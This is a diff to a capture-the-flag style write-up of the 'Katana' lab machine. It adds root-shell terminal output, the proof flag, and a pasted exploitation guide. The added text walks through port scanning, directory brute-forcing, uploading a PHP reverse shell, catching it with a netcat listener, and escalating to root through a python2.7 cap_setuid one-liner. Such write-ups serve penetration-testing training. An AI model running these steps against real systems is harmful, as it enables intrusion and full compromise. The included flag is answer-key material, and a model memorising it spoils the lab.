@@ -410,17 +410,37 @@ www-data@katana:~/html/ebook/database$ /tmp/linpeas.sh
 /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
 ```
 
+```zsh
+www-data@katana:/$ getcap -r / 2>/dev/null
+
+getcap -r / 2>/dev/null
+
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/python2.7 = cap_setuid+ep
+www-data@katana:/$ 
+www-data@katana:/$ /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
+
+< 'import os; os.setuid(0); os.system("/bin/bash");'
+root@katana:/# 
+root@katana:/# id
+id
+uid=0(root) gid=33(www-data) groups=33(www-data)
 ```
 
 ```zsh
-
-```
-
-```zsh
-
-```
-
-```zsh
+root@katana:/# cat /root/proof.txt
+cat /root/proof.txt
+b2ef7decd1dda38f71813688c69bf0ed
+root@katana:/# ip a
+ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+3: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 00:50:56:ab:d4:cc brd ff:ff:ff:ff:ff:ff
+    inet 192.168.231.83/24 brd 192.168.231.255 scope global ens33
+       valid_lft forever preferred_lft forever
 
 ```
 
@@ -429,6 +449,129 @@ www-data@katana:~/html/ebook/database$ /tmp/linpeas.sh
 <summary>Walkthrough</summary>
 
 ```zsh
+Walkthrough
+Close
+Exploitation Guide for Katana
+Summary
+This machine is exploited by a file upload vulnerability in a web application. It is escalated by exploiting a misconfigured Linux file capability in the python2.7 binary.
+
+Enumeration
+Nmap
+We start off by running an nmap scan:
+
+kali@kali:~$ sudo nmap -p- 192.168.120.154
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 11:33 EDT
+Nmap scan report for 192.168.120.154
+Host is up (0.030s latency).
+Not shown: 65527 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+80/tcp   open  http
+3389/tcp open  ms-wbt-server
+7080/tcp open  empowerid
+8088/tcp open  radan-http
+8715/tcp open  unknown
+9198/tcp open  unknown
+Dirb
+Using dirb and the default wordlist, we are able to brute-force and discover upload.html on port 8088:
+
+kali@kali:~$ dirb http://192.168.120.155:8088 -X .html -r
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Thu Aug 20 14:05:14 2020
+URL_BASE: http://192.168.120.155:8088/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+OPTION: Not Recursive
+EXTENSIONS_LIST: (.html) | (.html) [NUM = 1]
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.120.155:8088/ ----
++ http://192.168.120.155:8088/error404.html (CODE:200|SIZE:195)                                                
++ http://192.168.120.155:8088/index.html (CODE:200|SIZE:655)                                                   
++ http://192.168.120.155:8088/upload.html (CODE:200|SIZE:6480)                                                 
+                                                                                                               
+-----------------
+END_TIME: Thu Aug 20 14:07:40 2020
+DOWNLOADED: 4612 - FOUND: 3
+Exploitation
+File Upload Vulnerability
+Navigating to http://192.168.120.155:8088/upload.html, we see a couple of file upload controls. We are able to upload the PHP reverse shell available at /usr/share/webshells/php/php-reverse-shell.php:
+
+kali@kali:~$ locate php-reverse-shell.php
+...
+/usr/share/webshells/php/php-reverse-shell.php
+...
+kali@kali:~$
+Set the local port to 4444 in the PHP reverse shell. We can choose either control for our upload. After selecting the prepared PHP reverse shell, click Submit Query. The following message appears:
+
+Please wait for 1 minute!. Please relax!.
+
+File : file1
+Name :
+Type :
+Path :
+Size : 0
+Please wait for 1 minute!. Please relax!.
+
+file is empty, not stored.
+
+File : file2
+Name : php-reverse-shell.php
+Type : application/x-php
+Path : /tmp/phpFjoLWh
+Size : 5495
+Please wait for 1 minute!. Please relax!.
+
+Moved to other web server: /tmp/phpFjoLWh ====> /opt/manager/html/katana_php-reverse-shell.php
+MD5 : 8783aa0d056e9e74e9d9856605d072a5
+Size : 5495 bytes
+The important part is this:
+
+Moved to other web server: /tmp/phpFjoLWh ====> /opt/manager/html/katana_php-reverse-shell.php
+First, start a netcat listener on port 4444. From the nmap scan, we saw an open port 8715. Using some guess work and the above message, we can trigger the reverse shell by navigating to http://192.168.120.155:8715/katana_php-reverse-shell.php:
+
+kali@kali:~$ nc -lvp 4444
+listening on [any] 4444 ...
+192.168.120.155: inverse host lookup failed: Unknown host
+connect to [192.168.118.3] from (UNKNOWN) [192.168.120.155] 57806
+Linux katana 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
+ 13:36:02 up 1 min,  0 users,  load average: 0.03, 0.02, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@katana:/$
+Escalation
+Checking File Capabilities
+Using getcap with the recursive flag from the root directory, we see file capability with +ep permission is set on python2.7:
+
+www-data@katana:~$ getcap -r / 2>/dev/null
+getcap -r / 2>/dev/null
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/python2.7 = cap_setuid+ep
+www-data@katana:~$
+Linux file capabilities are maintained by the kernel. This concept is similar to how SUID functions. Linux’s thread privilege checking is based on capabilities. Capabilities work by breaking the actions normally reserved for root down into smaller portions. The file capability sets are stored in an extended attribute named security.capability.
+
+We are able to abuse the capabilities misconfiguration of python2.7 to drop ourselves into a root shell:
+
+www-data@katana:~$ whoami
+whoami
+www-data
+www-data@katana:~$ /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+<c 'import os; os.setuid(0); os.system("/bin/bash")'
+root@katana:~# whoami
+whoami
+root
+root@katana:~# 
+
 
 ```
 
